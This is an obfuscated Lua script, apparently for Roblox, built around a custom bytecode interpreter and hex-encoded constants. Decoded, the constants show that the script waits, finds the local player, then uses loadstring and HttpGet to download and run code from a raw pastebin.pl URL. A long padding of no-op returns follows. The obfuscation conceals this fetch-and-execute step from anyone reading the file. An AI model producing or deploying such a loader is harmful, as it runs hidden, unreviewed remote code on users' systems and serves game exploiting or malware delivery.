-- file was generated on 11/16/22 (18:51:31)

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=getfenv or function()return _ENV;end;local v9=setmetatable;local v10=pcall;local v11=select;local v12=unpack or table.unpack;local v13=tonumber;local function v14(v15,v16)local v17=1;local v18;v15=v4(v3(v15,5),"..",function(v29)if (v1(v29,2)==79) then v18=v0(v3(v29,1,1));return "";else local v70=v2(v0(v29,16));if v18 then local v82=v5(v70,v18);v18=nil;return v82;else return v70;end end end);local function v19(v30,v31,v32)if v32 then local v71=(v30/(2^(v31-1)))%(2^(((v32-1) -(v31-1)) + 1));return v71-(v71%1);else local v72=2^(v31-1);return (((v30%(v72 + v72))>=v72) and 1) or 0;end end local function v20()local v37=v1(v15,v17,v17);v17=v17 + 1;return v37;end local function v21()local v38,v39=v1(v15,v17,v17 + 2);v17=v17 + 2;return (v39 * 256) + v38;end local function v22()local v40,v41,v42,v43=v1(v15,v17,v17 + 3);v17=v17 + 4;return (v43 * 16777216) + (v42 * 65536) + (v41 * 256) + v40;end local function v23()local v44=v22();local v45=v22();return (( -2 * v19(v45,32)) + 1) * (2^(v19(v45,21,31) -1023)) * ((((v19(v45,1,20) * (2^32)) + v44)/(2^52)) + 1);end local function v24(v33)local v46;if  not v33 then v33=v22();if (v33==0) then return "";end end v46=v3(v15,v17,(v17 + v33) -1);v17=v17 + v33;local v47={};for v58=1, #v46 do v47[v58]=v2(v1(v3(v46,v58,v58)));end return v6(v47);end local v25=v22;local function v26(...)return {...},v11("#",...);end local function v27()local v48={};local v49={};local v50={};local v51={v48,v49,nil,v50};local v52=v22();local v53={};for v60=1,v52 do local v61=v20();local v62;if (v61==1) then v62=v20()~=0;elseif (v61==2) then v62=v23();elseif (v61==3) then v62=v24();end v53[v60]=v62;end v51[3]=v20();for v64=1,v22() do local v65=v20();if (v19(v65,1,1)==0) then local v78=v19(v65,2,3);local v79=v19(v65,4,6);local v80={v21(),v21(),nil,nil};if (v78==0) then v80[3]=v21();v80[4]=v21();elseif (v78==1) then v80[3]=v22();elseif (v78==2) then v80[3]=v22() -(2^16);elseif (v78==3) then v80[3]=v22() -(2^16);v80[4]=v21();end if (v19(v79,1,1)==1) then v80[2]=v53[v80[2]];end if (v19(v79,2,2)==1) then v80[3]=v53[v80[3]];end if (v19(v79,3,3)==1) then v80[4]=v53[v80[4]];end v48[v64]=v80;end end for v66=1,v22() do v49[v66-1]=v27();end for v68=1,v22() do v50[v68]=v22();end return v51;end local function v28(v34,v35,v36)local v55=v34[1];local v56=v34[2];local v57=v34[3];return function(...)local v73=1;local v74= -1;local v75={...};local v76=v11("#",...) -1;local function v77()local v83=v55;local v84=Const;local v85=v56;local v86=v57;local v87=v26;local v88={};local v89={};local v90={};for v100=0,v76 do if (v100>=v86) then v88[v100-v86]=v75[v100 + 1];else v90[v100]=v75[v100 + 1];end end local v91=(v76-v86) + 1;local v92;local v93;while true do v92=v83[v73];v93=v92[1];if (v93<=6) then if (v93<=2) then if (v93<=0) then if v90[v92[2]] then v73=v73 + 1;else v73=v92[3];end elseif (v93==1) then v73=v92[3];else local v108=v92[2];local v109,v110=v87(v90[v108](v12(v90,v108 + 1,v92[3])));v74=(v110 + v108) -1;local v111=0;for Idx=v108,v74 do v111=v111 + 1;v90[Idx]=v109[v111];end end elseif (v93<=4) then if (v93==3) then local v112=v92[2];local v113=v90[v92[3]];v90[v112 + 1]=v113;v90[v112]=v113[v92[4]];else v90[v92[2]]=v92[3];end elseif (v93==5) then do return;end else v90[v92[2]]=v90[v92[3]][v92[4]];end elseif (v93<=9) then if (v93<=7) then local v107=v92[2];v90[v107](v90[v107 + 1]);elseif (v93==8) then v90[v92[2]]=v36[v92[3]];else local v119=v92[2];do return v12(v90,v119,v119 + v92[3]);end end elseif (v93<=11) then if (v93>10) then local v120=v92[2];v90[v120]=v90[v120](v12(v90,v120 + 1,v74));else do return v90[v92[2]];end end elseif (v93==12) then v90[v92[2]]();else v90[v92[2]]=v92[3]~=0;end v73=v73 + 1;end end A,B=v26(v10(v77));if  not A[1] then local v94=v34[4][v73] or "?";error("Script error at ["   .. v94   .. "]:"   .. A[2]);else return v12(A,2,B);end end;end return v28(v27(),{},v16)();end v14("LOL!093O0003043O0077616974026O00F03F03043O0067616D6503073O00506C6179657273030B3O004C6F63616C506C61796572030A3O006C6F6164737472696E6703073O00482O747047657403253O00682O7470733A2O2F706173746562696E2E706C2F766965772F7261772F396334642O38623203043O006E6963650029012O0012083O00013O001204000100024O00073O000200010012083O00033O0020065O00040020065O000500066O00013O0004015O00010012083O00063O001208000100033O002003000100010007001204000300084O000D000400014O0002000100044O000B5O00022O000C3O000100012O000D7O00064O001500013O0004013O001500010012043O00094O000A3O00024O000D7O00064O001A00013O0004013O001A00010012043O00094O000A3O00024O000D7O00064O001F00013O0004013O001F00010012043O00094O000A3O00024O000D7O00064O002400013O0004013O002400010012043O00094O000A3O00024O000D7O00064O002900013O0004013O002900010012043O00094O000A3O00024O000D7O00064O002E00013O0004013O002E00010012043O00094O000A3O00024O000D7O00064O003300013O0004013O003300010012043O00094O000A3O00024O000D7O00064O003800013O0004013O003800010012043O00094O000A3O00024O000D7O00064O003D00013O0004013O003D00010012043O00094O000A3O00024O000D7O00064O004200013O0004013O004200010012043O00094O000A3O00024O000D7O00064O004700013O0004013O004700010012043O00094O000A3O00024O000D7O00064O004C00013O0004013O004C00010012043O00094O000A3O00024O000D7O00064O005100013O0004013O005100010012043O00094O000A3O00024O000D7O00064O005600013O0004013O005600010012043O00094O000A3O00024O000D7O00064O005B00013O0004013O005B00010012043O00094O000A3O00024O000D7O00064O006000013O0004013O006000010012043O00094O000A3O00024O000D7O00064O006500013O0004013O006500010012043O00094O000A3O00024O000D7O00064O006A00013O0004013O006A00010012043O00094O000A3O00024O000D7O00064O006F00013O0004013O006F00010012043O00094O000A3O00024O000D7O00064O007400013O0004013O007400010012043O00094O000A3O00024O000D7O00064O007900013O0004013O007900010012043O00094O000A3O00024O000D7O00064O007E00013O0004013O007E00010012043O00094O000A3O00024O000D7O00064O008300013O0004013O008300010012043O00094O000A3O00024O000D7O00064O008800013O0004013O008800010012043O00094O000A3O00024O000D7O00064O008D00013O0004013O008D00010012043O00094O000A3O00024O000D7O00064O009200013O0004013O009200010012043O00094O000A3O00024O000D7O00064O009700013O0004013O009700010012043O00094O000A3O00024O000D7O00064O009C00013O0004013O009C00010012043O00094O000A3O00024O000D7O00064O00A100013O0004013O00A100010012043O00094O000A3O00024O000D7O00064O00A600013O0004013O00A600010012043O00094O000A3O00024O000D7O00064O00AB00013O0004013O00AB00010012043O00094O000A3O00024O000D7O00064O00B000013O0004013O00B000010012043O00094O000A3O00024O000D7O00064O00B500013O0004013O00B500010012043O00094O000A3O00024O000D7O00064O00BA00013O0004013O00BA00010012043O00094O000A3O00024O000D7O00064O00BF00013O0004013O00BF00010012043O00094O000A3O00024O000D7O00064O00C400013O0004013O00C400010012043O00094O000A3O00024O000D7O00064O00C900013O0004013O00C900010012043O00094O000A3O00024O000D7O00064O00CE00013O0004013O00CE00010012043O00094O000A3O00024O000D7O00064O00D300013O0004013O00D300010012043O00094O000A3O00024O000D7O00064O00D800013O0004013O00D800010012043O00094O000A3O00024O000D7O00064O00DD00013O0004013O00DD00010012043O00094O000A3O00024O000D7O00064O00E200013O0004013O00E200010012043O00094O000A3O00024O000D7O00064O00E700013O0004013O00E700010012043O00094O000A3O00024O000D7O00064O00EC00013O0004013O00EC00010012043O00094O000A3O00024O000D7O00064O00F100013O0004013O00F100010012043O00094O000A3O00024O000D7O00064O00F600013O0004013O00F600010012043O00094O000A3O00024O000D7O00064O00FB00013O0004013O00FB00010012043O00094O000A3O00024O000D7O00065O002O013O0004014O002O010012043O00094O000A3O00024O000D7O00064O00052O013O0004013O00052O010012043O00094O000A3O00024O000D7O00064O000A2O013O0004013O000A2O010012043O00094O000A3O00024O000D7O00064O000F2O013O0004013O000F2O010012043O00094O000A3O00024O000D7O00064O00142O013O0004013O00142O010012043O00094O000A3O00024O000D7O00064O00192O013O0004013O00192O010012043O00094O000A3O00024O000D7O00064O001E2O013O0004013O001E2O010012043O00094O000A3O00024O000D7O00064O00232O013O0004013O00232O010012043O00094O000A3O00024O000D7O00064O00282O013O0004013O00282O010012043O00094O000A3O00024O00053O00017O0029012O00023O00023O00023O00033O00033O00033O00033O00033O00043O00043O00043O00043O00043O00043O00043O00043O00053O00053O00053O00063O00063O00083O00083O00083O00093O00093O000B3O000B3O000B3O000C3O000C3O000E3O000E3O000E3O000F3O000F3O00113O00113O00113O00123O00123O00143O00143O00143O00153O00153O00173O00173O00173O00183O00183O001A3O001A3O001A3O001B3O001B3O001D3O001D3O001D3O001E3O001E3O00203O00203O00203O00213O00213O00233O00233O00233O00243O00243O00263O00263O00263O00273O00273O00293O00293O00293O002A3O002A3O002C3O002C3O002C3O002D3O002D3O002F3O002F3O002F3O00303O00303O00323O00323O00323O00333O00333O00353O00353O00353O00363O00363O00383O00383O00383O00393O00393O003B3O003B3O003B3O003C3O003C3O003E3O003E3O003E3O003F3O003F3O00413O00413O00413O00423O00423O00443O00443O00443O00453O00453O00473O00473O00473O00483O00483O004A3O004A3O004A3O004B3O004B3O004D3O004D3O004D3O004E3O004E3O00503O00503O00503O00513O00513O00533O00533O00533O00543O00543O00563O00563O00563O00573O00573O00593O00593O00593O005A3O005A3O005C3O005C3O005C3O005D3O005D3O005F3O005F3O005F3O00603O00603O00623O00623O00623O00633O00633O00653O00653O00653O00663O00663O00683O00683O00683O00693O00693O006B3O006B3O006B3O006C3O006C3O006E3O006E3O006E3O006F3O006F3O00713O00713O00713O00723O00723O00743O00743O00743O00753O00753O00773O00773O00773O00783O00783O007A3O007A3O007A3O007B3O007B3O007D3O007D3O007D3O007E3O007E3O00803O00803O00803O00813O00813O00833O00833O00833O00843O00843O00863O00863O00863O00873O00873O00893O00893O00893O008A3O008A3O008C3O008C3O008C3O008D3O008D3O008F3O008F3O008F3O00903O00903O00923O00923O00923O00933O00933O00953O00953O00953O00963O00963O00983O00983O00983O00993O00993O009B3O009B3O009B3O009C3O009C3O009E3O009E3O009E3O009F3O009F3O00A13O00A13O00A13O00A23O00A23O00A43O00A43O00A43O00A53O00A53O00A73O00A73O00A73O00A83O00A83O00AA3O00AA3O00AA3O00AB3O00AB3O00AC3O00",v8());
